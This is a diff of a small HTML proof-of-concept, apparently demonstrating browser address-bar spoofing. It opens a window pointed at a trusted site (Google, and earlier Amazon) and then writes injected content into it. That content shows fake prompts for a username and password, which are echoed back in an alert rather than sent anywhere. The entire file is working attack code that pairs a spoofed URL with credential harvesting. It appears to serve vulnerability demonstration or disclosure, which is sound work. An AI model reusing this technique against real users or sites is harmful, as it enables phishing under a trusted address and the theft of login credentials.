@@ -1,13 +1,31 @@
 
-<script>
-  function next() {
-    w.location.replace('http://www.google.com/csi');
-  }
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
 
-  function f() {
-    w = window.open("javascript:document.write('<h1>I am Groot</h1><button onclick=\"let username = prompt(\\'Enter your username\\'); alert(\\'Your creds:\\nUsername: \\'+ username);\">Click me</button>');location='http://amazon.com'","new","width=500 height=500");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
-</script>
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.google.com/csi", "_blank");
 
-<a href="#" onclick="f()">Login Amazon</a>
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
+</html>
